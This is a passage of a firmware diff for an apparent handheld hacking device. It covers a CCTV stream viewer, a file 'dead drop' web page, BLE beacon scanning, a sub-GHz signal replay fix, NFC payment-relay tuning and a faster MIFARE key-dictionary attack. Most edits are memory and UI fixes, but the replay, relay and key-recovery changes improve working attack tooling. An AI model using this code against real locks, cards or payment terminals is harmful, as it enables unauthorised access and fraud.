@@ -26443,7 +27199,7 @@ bool mjpegViewerFS(const char* url, fs::FS& fs, const char* pathA, const char* p
     // ---- Headers (deadline 5s) ----
     String boundary, contentTypeSeen;
     while (true) {
-      int n = readLineCCTV(client, line, sizeof(line));
+      int n = readLineCCTV(client, line, 768);
       if (n > 0) {
         String hLow = String(line); hLow.toLowerCase();
         if (hLow.startsWith("content-type:")) {
@@ -26501,7 +27257,7 @@ bool mjpegViewerFS(const char* url, fs::FS& fs, const char* pathA, const char* p
     bool alreadySyncedFirstPart = false;
     if (!boundary.length()) {
       while (true) {
-        int n = readLineCCTV(client, line, sizeof(line));
+        int n = readLineCCTV(client, line, 768);
         if (n > 0) {
           if (line[0] == '-' && line[1] == '-') {
             boundary = String(line);
@@ -26587,7 +27343,7 @@ bool mjpegViewerFS(const char* url, fs::FS& fs, const char* pathA, const char* p
       bool synced = alreadySyncedFirstPart; alreadySyncedFirstPart = false;
       if (!synced) {
         while (true) {
-          int n = readLineCCTV(client, line, sizeof(line));
+          int n = readLineCCTV(client, line, 768);
           if (n <= 0) {
             if (client.available() == 0) break;
             else {
@@ -26611,7 +27367,7 @@ bool mjpegViewerFS(const char* url, fs::FS& fs, const char* pathA, const char* p
       // headers part
       size_t contentLen = 0; bool haveLen = false; bool headerEnd = false;
       while (true) {
-        int n = readLineCCTV(client, line, sizeof(line));
+        int n = readLineCCTV(client, line, 768);
         if (n <= 0) {
           if (client.available() > 0) headerEnd = true;
           break;
@@ -26640,12 +27396,23 @@ bool mjpegViewerFS(const char* url, fs::FS& fs, const char* pathA, const char* p
         break;
       }
 
-      bool ok = true; size_t totalWritten = 0; uint8_t buf[IO_CHUNK];
+      bool ok = true; size_t totalWritten = 0;   // 'buf' (IO_CHUNK) is the wrapper-owned heap buffer
 
       if (haveLen && contentLen > 0) {
+        if (contentLen > MJPEG_MAX_FRAME) {                 // bogus/oversized Content-Length -> drop, don't hang
+          MJLOG("[MJPEG-DBG] Oversized frame %u -> reconnect\n", (unsigned)contentLen);
+          f.close(); reconnect = true; break;
+        }
         MJLOG("[MJPEG-DBG] Expecting %u bytes for frame\n", (unsigned)contentLen);
-        size_t remain = contentLen;
+        size_t remain = contentLen; uint32_t frameStart = millis();
         while (remain > 0) {
+          M5.update(); cardUpdate();                        // keep the UI alive + let the user escape
+          if (kp(KEY_BACKSPACE)) { keyRelease(); exitToMenu = true; ok = false; break; }
+          if (kp('`')) { keyRelease(); switchDelta = -1; ok = false; break; }
+          if (millis() - frameStart > MJPEG_FRAME_DEADLINE_MS) {   // whole-frame budget blown
+            MJLOG("[MJPEG-DBG] Frame deadline, remain=%u\n", (unsigned)remain);
+            ok = false; break;
+          }
           size_t toRead = (remain > IO_CHUNK) ? IO_CHUNK : remain;
           size_t got = readN(client, buf, toRead, READ_CHUNK_DEADLINE_MS);
           if (got == 0) {
@@ -26661,8 +27428,12 @@ bool mjpegViewerFS(const char* url, fs::FS& fs, const char* pathA, const char* p
           remain -= got; totalWritten += got;
         }
       } else {
-        bool lastFF = false; uint32_t waitStart = millis();
+        bool lastFF = false; uint32_t waitStart = millis(); uint32_t frameStart = millis();
         while (true) {
+          M5.update(); cardUpdate();                        // UI alive + escape during the frame read
+          if (kp(KEY_BACKSPACE)) { keyRelease(); exitToMenu = true; ok = false; break; }
+          if (kp('`')) { keyRelease(); switchDelta = -1; ok = false; break; }
+          if (totalWritten > MJPEG_MAX_FRAME || millis() - frameStart > MJPEG_FRAME_DEADLINE_MS) { ok = false; break; }
           int avail = client.available();
           int want  = (avail > 0) ? min(avail, (int)IO_CHUNK) : 1;
           int r = client.read(buf, want);
@@ -26742,6 +27513,18 @@ bool mjpegViewerFS(const char* url, fs::FS& fs, const char* pathA, const char* p
     return false; // relancer viewer direct (sans repasser par menu)
   }
   return true; // retour menu
+}
+
+// Public entry (unchanged signature for all callers): allocates the two scratch
+// buffers on the heap for the viewing session and frees them on return, so they
+// no longer sit permanently in .bss. Called once per stream (impl loops inside).
+bool mjpegViewerFS(const char* url, fs::FS& fs, const char* pathA, const char* pathB) {
+  char*    line = (char*)malloc(768);
+  uint8_t* buf  = (uint8_t*)malloc(IO_CHUNK);
+  if (!line || !buf) { free(line); free(buf); return true; }   // OOM: behave like a bad URL
+  bool r = mjpegViewerFS_impl(url, fs, pathA, pathB, line, buf);
+  free(line); free(buf);
+  return r;
 }
 
 
@@ -28985,7 +29768,10 @@ int ddCountFiles() {
   while (true) {
     File f = dir.openNextFile();
     if (!f) break;
-    if (!f.isDirectory()) n++;
+    if (!f.isDirectory()) {
+      String nm = f.name(); int p = nm.lastIndexOf('/'); if (p >= 0) nm = nm.substring(p + 1);
+      if (nm != "notes.txt") n++;   // notes.txt is the notes store, not an uploaded file
+    }
     f.close();
   }
   dir.close();
@@ -29212,7 +29998,8 @@ void setupDeadDropRoutes() {
   
     // Upload section
     html += "<h3>Upload a File</h3>";
-    html += "<input id='f' class='block' type='file'>";
+    html += "<input id='f' class='block' type='file' onchange='sel()'>";
+    html += "<div id='sel' style='font-size:13px;color:#0ff;margin:4px 0;'></div>";
     html += "<button class='block' onclick='up()'>Upload</button>";
     html += "<progress id='prog' value='0' max='100' style='display:none'></progress>";
     html += "<div id='status'></div>";
@@ -29233,6 +30020,7 @@ void setupDeadDropRoutes() {
     // Script with percent + speed + transferred
     html += "<script>";
     html += "function human(x){if(x<1024)return x+' B';if(x<1048576)return(x/1024).toFixed(1)+' KB';if(x<1073741824)return(x/1048576).toFixed(1)+' MB';return(x/1073741824).toFixed(1)+' GB';}";
+    html += "function sel(){var f=document.getElementById('f').files[0];document.getElementById('sel').textContent=f?('Selected: '+f.name+' ('+human(f.size)+')'):'';}";
     html += "function up(){";
     html += " var f=document.getElementById('f').files[0];";
     html += " if(!f){alert('Select a file');return;}";
@@ -29286,18 +30074,38 @@ void setupDeadDropRoutes() {
       if (!f) break;
       if (!f.isDirectory()) {
         String base = f.name(); int p = base.lastIndexOf('/'); if (p >= 0) base = base.substring(p + 1);
-        unsigned long sz = f.size();
-        String sizeStr;
-        if (sz > 1000000000) sizeStr = String((float)sz / 1000000000.0, 2) + " GB";
-        else if (sz > 1000000) sizeStr = String((float)sz / 1000000.0, 2) + " MB";
-        else if (sz > 1000) sizeStr = String((float)sz / 1000.0, 1) + " KB";
-        else sizeStr = String(sz) + " B";
-        html += "<tr><td><a href='/dd-get?f=" + ddUrlEncode(base) + "'>" + ddHtmlEscape(base) + "</a></td><td>" + sizeStr + "</td></tr>";
+        if (base != "notes.txt") {   // notes.txt is rendered as notes below, not as a file
+          unsigned long sz = f.size();
+          String sizeStr;
+          if (sz > 1000000000) sizeStr = String((float)sz / 1000000000.0, 2) + " GB";
+          else if (sz > 1000000) sizeStr = String((float)sz / 1000000.0, 2) + " MB";
+          else if (sz > 1000) sizeStr = String((float)sz / 1000.0, 1) + " KB";
+          else sizeStr = String(sz) + " B";
+          html += "<tr><td><a href='/dd-get?f=" + ddUrlEncode(base) + "'>" + ddHtmlEscape(base) + "</a></td><td>" + sizeStr + "</td></tr>";
+        }
       }
       f.close();
     }
     dir.close();
-    html += "</table><p><a href='/'>⬅ Back</a></p></body></html>";
+    html += "</table>";
+
+    // Notes section: render notes.txt content (was never shown; #111). Capped so a
+    // huge notes file can't blow up the response String / heap.
+    File nf = SD.open(String(DD_BASE) + "/notes.txt", FILE_READ);
+    html += "<h3>&#128221; Notes</h3>";
+    if (nf) {
+      int shown = 0;
+      while (nf.available() && shown < 150 && html.length() < 24000) {
+        String ln = nf.readStringUntil('\n'); ln.trim();
+        if (ln.length()) { html += "<div style='border-bottom:1px solid #222;padding:6px 0;text-align:left;'>" + ddHtmlEscape(ln) + "</div>"; shown++; }
+      }
+      nf.close();
+      if (shown == 0) html += "<p style='color:#666'>No notes yet.</p>";
+    } else {
+      html += "<p style='color:#666'>No notes yet.</p>";
+    }
+
+    html += "<p><a href='/'>⬅ Back</a></p></body></html>";
     req->send(200, "text/html", html);
   });
 
@@ -29318,7 +30126,10 @@ void setupDeadDropRoutes() {
     const String mime     = ddMimeFromExt(f);
   
     ddActiveTransfers++;  // <--- mark running transfer
-  
+    ddDownloadsCount++;   // count at start: ESPAsyncWebServer stops calling the chunk
+                          // callback once Content-Length is met, so the end-of-file
+                          // branch below never ran -> downloads never registered.
+
     AsyncWebServerResponse *resp = req->beginResponse(
       mime, fileSize,
       [file](uint8_t *buffer, size_t maxLen, size_t index) mutable -> size_t {
@@ -29328,10 +30139,9 @@ void setupDeadDropRoutes() {
           ddActiveTransfers--;
           return 0;
         }
-  
+
         if (!file.available()) {
           if (file) file.close();
-          ddDownloadsCount++;
           ddActiveTransfers--;
           return 0; // done
         }
@@ -29602,7 +30412,8 @@ void setupDeadDropRoutesSync() {
     html += "<p>Welcome to the underground dead drop. Share files or leave notes.</p>";
 
     html += "<h3>Upload a File</h3>";
-    html += "<input id='f' class='block' type='file'>";
+    html += "<input id='f' class='block' type='file' onchange='sel()'>";
+    html += "<div id='sel' style='font-size:13px;color:#0ff;margin:4px 0;'></div>";
     html += "<button class='block' onclick='up()'>Upload</button>";
     html += "<progress id='prog' value='0' max='100' style='display:none'></progress>";
     html += "<div id='status'></div>";
@@ -29618,6 +30429,7 @@ void setupDeadDropRoutesSync() {
 
     html += "<script>";
     html += "function human(x){if(x<1024)return x+' B';if(x<1048576)return(x/1024).toFixed(1)+' KB';if(x<1073741824)return(x/1048576).toFixed(1)+' MB';return(x/1073741824).toFixed(1)+' GB';}";
+    html += "function sel(){var f=document.getElementById('f').files[0];document.getElementById('sel').textContent=f?('Selected: '+f.name+' ('+human(f.size)+')'):'';}";
     html += "function up(){";
     html += " var f=document.getElementById('f').files[0];";
     html += " if(!f){alert('Select a file');return;}";
@@ -40318,11 +41130,12 @@ struct BcnEntry {
   uint32_t lastSeen;
 };
 #define BCN_MAX 40
-static BcnEntry     bcn_list[BCN_MAX];
+static BcnEntry*    bcn_list = nullptr;   // heap-allocated only while Beacon Scan runs
 static volatile int bcn_count = 0;
 static portMUX_TYPE bcn_mux = portMUX_INITIALIZER_UNLOCKED;
 
 int bcn_find(const uint8_t* mac, uint8_t type) {
+  if (!bcn_list) return -1;
   for (int i = 0; i < bcn_count; i++)
     if (bcn_list[i].type == type && memcmp(bcn_list[i].mac, mac, 6) == 0) return i;
   return -1;
@@ -40400,7 +41213,7 @@ public:
     portENTER_CRITICAL(&bcn_mux);
     int idx = bcn_find(e.mac, e.type);
     if (idx < 0 && bcn_count < BCN_MAX) idx = bcn_count++;
-    if (idx >= 0) bcn_list[idx] = e;
+    if (idx >= 0 && bcn_list) bcn_list[idx] = e;
     portEXIT_CRITICAL(&bcn_mux);
   }
 };
@@ -41143,6 +41956,10 @@ void beaconScanMenu() {
 
   portENTER_CRITICAL(&bcn_mux); bcn_count = 0; portEXIT_CRITICAL(&bcn_mux);
 
+  BcnEntry* bl0 = (BcnEntry*)calloc(BCN_MAX, sizeof(BcnEntry));   // heap only while running
+  if (!bl0) { if (sprite) { sprite->deleteSprite(); delete sprite; } releaseBLE(); waitAndReturnToMenu("Low memory"); return; }
+  bcn_list = bl0;
+
   BLEScan* scan = BLEDevice::getScan();
   scan->stop();
   scan->clearResults();
@@ -41170,6 +41987,8 @@ void beaconScanMenu() {
   scan->stop();
   scan->setAdvertisedDeviceCallbacks(nullptr);
   scan->clearResults();
+  delay(20);   // let any in-flight BLE callback finish before releasing the list
+  { BcnEntry* bl; portENTER_CRITICAL(&bcn_mux); bl = bcn_list; bcn_list = nullptr; portEXIT_CRITICAL(&bcn_mux); free(bl); }
   if (sprite) { sprite->deleteSprite(); delete sprite; }
   releaseBLE();
   waitAndReturnToMenu("Beacon Scan stopped");
@@ -44217,12 +45036,13 @@ void cc_start_rx() {
 
 #define CC_ISR_BUF_SIZE 1024
 struct CcEdge { bool level; int32_t dur; };
-volatile CcEdge cc_isr_buf[CC_ISR_BUF_SIZE];
+volatile CcEdge* cc_isr_buf = nullptr;   // heap-allocated only while RX ISR is attached
 volatile uint16_t cc_isr_head = 0;
 volatile uint16_t cc_isr_tail = 0;
 volatile uint32_t cc_isr_last_us = 0;
 
 void IRAM_ATTR cc_gdo0_isr() {
+    if (!cc_isr_buf) return;                 // buffer freed (RX stopped): defensive, no new edge should fire
     uint32_t now = (uint32_t)esp_timer_get_time();
     uint32_t dur = now - cc_isr_last_us;
     cc_isr_last_us = now;
@@ -44237,6 +45057,7 @@ void IRAM_ATTR cc_gdo0_isr() {
 }
 
 bool cc_isr_read(bool* level, int32_t* dur) {
+    if (!cc_isr_buf) return false;
     if (cc_isr_tail == cc_isr_head) return false;
     *level = cc_isr_buf[cc_isr_tail].level;
     *dur = cc_isr_buf[cc_isr_tail].dur;
@@ -44245,6 +45066,10 @@ bool cc_isr_read(bool* level, int32_t* dur) {
 }
 
 void cc_isr_start() {
+    if (!cc_isr_buf) {                       // allocate the 8 KB edge ring only while RX runs
+        cc_isr_buf = (volatile CcEdge*)malloc(sizeof(CcEdge) * CC_ISR_BUF_SIZE);
+        if (!cc_isr_buf) return;             // OOM: leave RX off rather than crash
+    }
     cc_isr_head = cc_isr_tail = 0;
     cc_isr_last_us = (uint32_t)esp_timer_get_time();
     attachInterrupt(digitalPinToInterrupt(CC_GDO0), cc_gdo0_isr, CHANGE);
@@ -44252,6 +45077,10 @@ void cc_isr_start() {
 
 void cc_isr_stop() {
     detachInterrupt(digitalPinToInterrupt(CC_GDO0));
+    delayMicroseconds(200);                  // let any in-flight ISR finish (buffer still valid)
+    volatile CcEdge* b = cc_isr_buf;         // then release the ring back to the heap
+    cc_isr_buf = nullptr;
+    free((void*)b);
 }
 
 void cc_set_raw_rx() {
@@ -45002,13 +45831,15 @@ bool cc_send_raw(int32_t* pulses, int count, int repeat) {
 
     // Configure CC1101 for async serial OOK TX
     cc_strobe(CC_SIDLE); delay(1);
-    cc_write_reg(CC_IOCFG0, 0x0D);   // async serial data I/O (bidirectional)
+    cc_write_reg(CC_IOCFG0, 0x2E);   // GDO0 high-Z: chip releases the pin so the ESP can bit-bang async TX data in (0x0D = chip-driven output = pin contention, no modulated OOK -> fixes Princeton/raw replay)
     cc_write_reg(CC_PKTCTRL0, 0x32);  // async serial mode, infinite packet
     cc_write_reg(CC_MDMCFG2, 0x30);   // OOK modulation, no sync
     cc_write_reg(CC_FREND0, 0x11);    // PA table index 1 for logic HIGH
-    // 3.8kbps data rate (Flipper convention: better noise immunity for OOK)
-    cc_write_reg(CC_MDMCFG4, 0x67);   // DRATE_E=7
-    cc_write_reg(CC_MDMCFG3, 0x32);   // DRATE_M=50 → ~3.79 kbps
+    // DRATE must sit well ABOVE the GDO0 edge rate for async transparent OOK TX, else the
+    // modem under-samples short pulses (a Princeton te~390us becomes ~1.5 symbols at 3.8kbps
+    // and gets smeared -> nothing decodable on-air). Match cc_brute_force (~100kbps), which radiates.
+    cc_write_reg(CC_MDMCFG4, 0x5B);   // DRATE_E=11
+    cc_write_reg(CC_MDMCFG3, 0xF8);   // DRATE_M=248 → ~100 kbps
     uint8_t pa_ook[8] = {0x00, 0xC0, 0, 0, 0, 0, 0, 0};
     cc_write_burst(CC_PA_TABLE, pa_ook, 8);
     cc_set_rf_switch(cc_freq_mhz);
@@ -45061,7 +45892,7 @@ bool cc_send_raw(int32_t* pulses, int count, int repeat) {
 bool cc_send_raw_fsk(int32_t* pulses, int count, int repeat, uint8_t deviatn) {
     if (count == 0) return false;
     cc_strobe(CC_SIDLE); delay(1);
-    cc_write_reg(CC_IOCFG0, 0x0D);    // async serial data I/O
+    cc_write_reg(CC_IOCFG0, 0x2E);    // GDO0 high-Z for ESP-driven async TX (was 0x0D = pin contention)
     cc_write_reg(CC_PKTCTRL0, 0x32);  // async serial mode, infinite packet
     cc_write_reg(CC_MDMCFG2, 0x00);   // 2-FSK, pas de sync, pas de manchester
     cc_write_reg(CC_DEVIATN, deviatn);// déviation FSK (def ~0x47 ≈ 47kHz)
@@ -46470,63 +47301,118 @@ void subGhzMenu() {
         // ── Mode 3: Saved (.sub files) ──
         }
         if (mode == 3) {
-            File dir = SD.open("/evil/subghz");
-            String files[20]; int file_count = 0;
-            if (dir) {
-                while (File entry = dir.openNextFile()) {
-                    if (!entry.isDirectory() && String(entry.name()).endsWith(".sub") && file_count < 20)
-                        files[file_count++] = String("/evil/subghz/") + entry.name();
-                    entry.close();
-                }
-                dir.close();
-            }
-            if (file_count == 0) {
-                sp.fillScreen(TFT_BLACK);
-                sp.setTextColor(TFT_RED, TFT_BLACK);
-                sp.setCursor(10, 55); sp.print("No .sub files found");
-                if (use_sprite) sprite->pushSprite(0, 0);
-                delay(2000);
-            } else {
-                int sel = 0, scroll = 0;
-                while (true) {
-                    int visible = min(file_count - scroll, 7);
-                    sp.fillScreen(TFT_BLACK);
-                    sp.fillRect(0, 0, W, 14, 0x0841);
-                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
-                    sp.printf("Saved (%d files)", file_count);
-                    for (int i = 0; i < visible; i++) {
-                        int idx = scroll + i;
-                        bool s = (idx == sel);
-                        sp.setTextColor(s ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
-                        sp.setCursor(4, 18 + i * 14);
-                        String fn = files[idx].substring(files[idx].lastIndexOf('/') + 1);
-                        if (fn.length() > 30) fn = fn.substring(0, 30);
-                        sp.print(s ? "> " : "  "); sp.print(fn);
-                    }
-                    sp.fillRect(0, H-14, W, 14, 0x0841);
-                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-                    sp.print(";=up .=dn ENT=send D=del");
-                    if (use_sprite) sprite->pushSprite(0, 0);
+            // Folder-aware, unlimited .sub browser. Lists subdirectories and .sub
+            // files of the current directory; ENTER enters a folder or opens a file,
+            // BACK goes up one level (or exits at root), N creates a folder. No fixed
+            // cap: the old String files[20] silently hid any save past the 20th.
+            const String rootDir = "/evil/subghz";
+            String curDir = rootDir;
+            std::vector<String> entries;   // dirs end with '/', ".." = up, else file full path
+            int sel = 0, scroll = 0;
 
-                    while (true) {
-                        M5.update(); cardUpdate();
-                        if (kp(KEY_BACKSPACE)) { keyRelease(); goto mode3_done; }
-                        if (kp('.')) {
-                            keyRelease(); sel = (sel + 1) % file_count;
-                            if (sel >= scroll + 7) scroll = sel - 6;
-                            if (sel < scroll) scroll = sel;
-                            break;
-                        }
-                        if (kp(';')) {
-                            keyRelease(); sel = (sel - 1 + file_count) % file_count;
-                            if (sel < scroll) scroll = sel;
-                            if (sel >= scroll + 7) scroll = sel - 6;
-                            break;
-                        }
-                        if (kp(KEY_ENTER)) {
-                            keyRelease();
+            auto baseName = [](const String& p) -> String {
+                String q = p; if (q.endsWith("/")) q.remove(q.length() - 1);
+                int s = q.lastIndexOf('/'); return (s >= 0) ? q.substring(s + 1) : q;
+            };
+            auto isDir = [](const String& e) { return e.endsWith("/"); };
+
+            auto rescan = [&]() {
+                entries.clear(); sel = 0; scroll = 0;
+                if (curDir != rootDir) entries.push_back(String(".."));
+                std::vector<String> ds, fs;
+                File dir = SD.open(curDir);
+                if (dir) {
+                    while (File entry = dir.openNextFile()) {
+                        String nm = entry.name();
+                        int sl = nm.lastIndexOf('/'); if (sl >= 0) nm = nm.substring(sl + 1);
+                        if (entry.isDirectory())      ds.push_back(curDir + "/" + nm + "/");
+                        else if (nm.endsWith(".sub"))  fs.push_back(curDir + "/" + nm);
+                        entry.close();
+                    }
+                    dir.close();
+                }
+                for (auto& d : ds) entries.push_back(d);
+                for (auto& f : fs) entries.push_back(f);
+            };
+
+            auto goUp = [&]() {
+                int s = curDir.lastIndexOf('/');
+                String parent = (s > 0) ? curDir.substring(0, s) : rootDir;
+                if (parent.length() < rootDir.length()) parent = rootDir;
+                curDir = parent; rescan();
+            };
+
+            if (!SD.exists(rootDir)) SD.mkdir(rootDir);
+            rescan();
+
+            while (true) {
+                int count = (int)entries.size();
+                if (sel >= count) sel = count ? count - 1 : 0;
+                if (scroll > sel) scroll = sel;
+                int visible = min(count - scroll, 7);
+                sp.fillScreen(TFT_BLACK);
+                sp.fillRect(0, 0, W, 14, 0x0841);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
+                { String rel = curDir.substring(rootDir.length()); if (rel.length() == 0) rel = "/";
+                  if (rel.length() > 16) rel = "..." + rel.substring(rel.length() - 13);
+                  sp.printf("SubGHz%s (%d)", rel.c_str(), count); }
+                if (count == 0) {
+                    sp.setTextColor(TFT_DARKGREEN, TFT_BLACK);
+                    sp.setCursor(4, 40); sp.print("(empty - N=new folder)");
+                }
+                for (int i = 0; i < visible; i++) {
+                    int idx = scroll + i; bool s = (idx == sel);
+                    String e = entries[idx], label;
+                    if (e == "..")      label = "[..]";
+                    else if (isDir(e))  label = "[" + baseName(e) + "]";
+                    else                label = baseName(e);
+                    if (label.length() > 30) label = label.substring(0, 30);
+                    sp.setTextColor(s ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
+                    sp.setCursor(4, 18 + i * 14);
+                    sp.print(s ? "> " : "  "); sp.print(label);
+                }
+                sp.fillRect(0, H-14, W, 14, 0x0841);
+                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+                sp.print(";. nav ENT=open N=mkdir D=del");
+                if (use_sprite) sprite->pushSprite(0, 0);
+
+                bool redraw = false;
+                while (!redraw) {
+                    M5.update(); cardUpdate();
+                    if (kp(KEY_BACKSPACE)) {
+                        keyRelease();
+                        if (curDir != rootDir) { goUp(); redraw = true; break; }
+                        goto mode3_done;
+                    }
+                    if (kp('n') || kp('N')) {
+                        keyRelease();
+                        M5.Display.fillScreen(TFT_BLACK);
+                        M5.Display.setTextSize(1.5); M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
+                        M5.Display.setCursor(5, 8); M5.Display.print("New folder name:");
+                        M5.Display.display();
+                        String nm = getUserInput(false, false); nm.trim(); nm.replace("/", "_");
+                        if (nm.length()) SD.mkdir(curDir + "/" + nm);
+                        rescan(); redraw = true; break;
+                    }
+                    if (count > 0 && kp('.')) {
+                        keyRelease(); sel = (sel + 1) % count;
+                        if (sel >= scroll + 7) scroll = sel - 6; if (sel < scroll) scroll = sel;
+                        redraw = true; break;
+                    }
+                    if (count > 0 && kp(';')) {
+                        keyRelease(); sel = (sel - 1 + count) % count;
+                        if (sel < scroll) scroll = sel; if (sel >= scroll + 7) scroll = sel - 6;
+                        redraw = true; break;
+                    }
+                    if (count > 0 && kp(KEY_ENTER)) {
+                        keyRelease();
+                        String e = entries[sel];
+                        if (e == "..") { goUp(); redraw = true; break; }
+                        if (isDir(e)) { curDir = e.substring(0, e.length() - 1); rescan(); redraw = true; break; }
+                        // ── a .sub file: load + detail page + resend (unchanged) ──
+                        {
                             uint32_t fhz = 433920000; int cnt = 0;
-                            int32_t* sub_data = cc_load_sub_malloc(files[sel].c_str(), &fhz, &cnt);
+                            int32_t* sub_data = cc_load_sub_malloc(e.c_str(), &fhz, &cnt);
                             if (sub_data && cnt > 0) {
                                 // Decode (pour l'affichage) comme en Read/Analyze
                                 cc_decoders_reset(); pp_decoders_reset();
@@ -46541,7 +47427,7 @@ void subGhzMenu() {
                                     if (dur > 60 && dur < 30000) gb.push_back(sub_data[i]);
                                 }
                                 { GateCode g; if (gate_multi_decode(gb, g)) { dec = {}; dec.protocol = g.protocol; dec.data = g.key; dec.bit_count = g.Bit; dec.serial = g.serial; dec.btn = g.btn; dec.cnt = g.cnt; dec.is_rolling = true; dec.te = g.te; decoded = true; } }
-                                String fn = files[sel].substring(files[sel].lastIndexOf('/') + 1);
+                                String fn = baseName(e);
                                 // ── Page detail + confirmation avant RESEND ──
                                 bool ddraw = true;
                                 while (true) {
@@ -46590,41 +47476,36 @@ void subGhzMenu() {
                                 if (use_sprite) sprite->pushSprite(0, 0);
                                 delay(1000);
                             }
-                            break;
                         }
-                        if (kp(KEY_DELETE) || kp('d') || kp('D')) {
-                            keyRelease();
-                            // Confirmation popup
-                            String fn_del = files[sel].substring(files[sel].lastIndexOf('/') + 1);
-                            sp.fillScreen(TFT_BLACK);
-                            sp.setTextColor(TFT_RED, TFT_BLACK);
-                            sp.setCursor(10, 40); sp.print("Delete this file?");
-                            sp.setTextColor(TFT_WHITE, TFT_BLACK);
-                            sp.setCursor(10, 60); sp.print(fn_del);
-                            sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                            sp.setCursor(10, 90); sp.print("ENTER=Yes  BACK=No");
-                            if (use_sprite) sprite->pushSprite(0, 0);
-                            bool confirmed = false;
-                            while (true) {
-                                M5.update(); cardUpdate();
-                                if (kp(KEY_ENTER)) { keyRelease(); confirmed = true; break; }
-                                if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
-                                delay(10);
-                            }
-                            if (confirmed) {
-                                SD.remove(files[sel].c_str());
-                                for (int i = sel; i < file_count-1; i++) files[i] = files[i+1];
-                                file_count--;
-                                if (file_count == 0) goto mode3_done;
-                                if (sel >= file_count) sel = file_count - 1;
-                            }
-                            break;
-                        }
-                        delay(10);
+                        redraw = true; break;
                     }
+                    if (count > 0 && (kp(KEY_DELETE) || kp('d') || kp('D'))) {
+                        keyRelease();
+                        String e = entries[sel];
+                        if (e == ".." || isDir(e)) { redraw = true; break; }   // delete files only
+                        String fn_del = baseName(e);
+                        sp.fillScreen(TFT_BLACK);
+                        sp.setTextColor(TFT_RED, TFT_BLACK);
+                        sp.setCursor(10, 40); sp.print("Delete this file?");
+                        sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                        sp.setCursor(10, 60); sp.print(fn_del);
+                        sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                        sp.setCursor(10, 90); sp.print("ENTER=Yes  BACK=No");
+                        if (use_sprite) sprite->pushSprite(0, 0);
+                        bool confirmed = false;
+                        while (true) {
+                            M5.update(); cardUpdate();
+                            if (kp(KEY_ENTER)) { keyRelease(); confirmed = true; break; }
+                            if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                            delay(10);
+                        }
+                        if (confirmed) { SD.remove(e.c_str()); rescan(); }
+                        redraw = true; break;
+                    }
+                    delay(10);
                 }
-                mode3_done:;
             }
+            mode3_done:;
 
         // ── Mode 4: Frequency Analyzer ──
         }
@@ -47545,7 +48426,7 @@ int nfc_raw_fifo_r(uint8_t* buf, int max_len) {
 // Logs de debug du relais/NFC (hot-path). 0 = OFF (relais rapide, RTT bas -> requis
 // pour un vrai paiement / RRP). Mettre 1 pour re-tracer les APDU au Proxmark.
 #ifndef RLY_DEBUG
-#define RLY_DEBUG 1
+#define RLY_DEBUG 0
 #endif
 
 uint8_t* nfc_transceive(const uint8_t* tx, int tx_len, int* rx_len, int timeout_ms) {
@@ -47728,6 +48609,9 @@ struct NfcCardInfo {
     bool valid;
 };
 
+// Fast mode: short RF settling delays for re-waking a card already powered in
+// the field (MIFARE dictionary loop). Off by default -> normal robust timings.
+bool g_nfc_fast = false;
 NfcCardInfo nfc_activate() {
     NfcCardInfo card = {};
     if (!nfc_opened) return card;
@@ -47742,7 +48626,7 @@ NfcCardInfo nfc_activate() {
     nfc_wr(NFC_AUX_DEF, a | 0x80);
     nfc_set_tx_len(0);
     nfc_cmd(NFC_CMD_TX_WUPA);
-    delay(10);
+    delay(g_nfc_fast ? 3 : 10);
     int fn = nfc_rr(NFC_FIFO_STA1);
     if (fn < 2) return card;
     uint8_t atqa_buf[2];
@@ -47763,7 +48647,7 @@ NfcCardInfo nfc_activate() {
         nfc_fifo_w(antcl, 2);
         nfc_set_tx_len(2);
         nfc_cmd(NFC_CMD_TX_NO_CRC);
-        delay(30);
+        delay(g_nfc_fast ? 8 : 30);
         fn = nfc_rr(NFC_FIFO_STA1);
         if (fn < 5) return card;
         uint8_t resp[5];
@@ -47784,7 +48668,7 @@ NfcCardInfo nfc_activate() {
         nfc_wr(NFC_TX_BYTES1, (val >> 8) & 0xFF);
         nfc_wr(NFC_TX_BYTES1 + 1, val & 0xFF);
         nfc_cmd(NFC_CMD_TX_CRC);
-        delay(20);
+        delay(g_nfc_fast ? 5 : 20);
         fn = nfc_rr(NFC_FIFO_STA1);
         if (fn < 1) return card;
         uint8_t sak_buf[3];
@@ -48489,7 +49373,7 @@ int nfc_mifare_read_all(NfcCardInfo& card, uint8_t block_data[][16], int max_blo
 
     mf_load_keys(); // load dictionary from SD or use defaults
     int sectors_read = 0;
-    int last_key_idx = 0;
+    int found[24]; int n_found = 0;      // keys already recovered -> retried first on each sector
 
     for (int sector = 0; sector < num_sectors; sector++) {
         int first_block = sector * 4;
@@ -48530,33 +49414,50 @@ int nfc_mifare_read_all(NfcCardInfo& card, uint8_t block_data[][16], int max_blo
             continue;
         }
 
-        // Try keys — last working key first, then all others
-        bool auth_ok = false;
-        for (int ki = 0; ki < MF_KEY_COUNT && !auth_ok; ki++) {
-            int key_idx = (ki == 0) ? last_key_idx : ((ki <= last_key_idx) ? ki - 1 : ki);
-            auth_ok = nfc_mifare_auth_crypto1(recard, first_block, MF_KEYS[key_idx]);
-            if (auth_ok) {
-                last_key_idx = key_idx;
-                Serial.printf("[MF] Sector %d: auth OK key #%d\n", sector, key_idx);
-            } else {
-                // Reactivate after failed auth
-                nfc_cmd(NFC_CMD_STOP_ALL);
-                delay(3);
-                nfc_wr(NFC_MODE_DEF, 0x09);
-                nfc_wr(NFC_BIT_RATE, 0x00);
-                nfc_cmd(NFC_CMD_RESET_GAIN);
-                nfc_cmd(NFC_CMD_CLEAR_FIFO);
-                nfc_wr(NFC_OP_CTRL, 0x80 | 0x40 | 0x08);
-                delay(5);
-                nfc_cmd(NFC_CMD_FIELD_ON);
-                delay(20);
-                recard = nfc_activate();
-                if (!recard.valid) break;
+        // Try keys: already-recovered keys first (cards reuse keys across
+        // sectors -> near-instant), then the full dictionary.
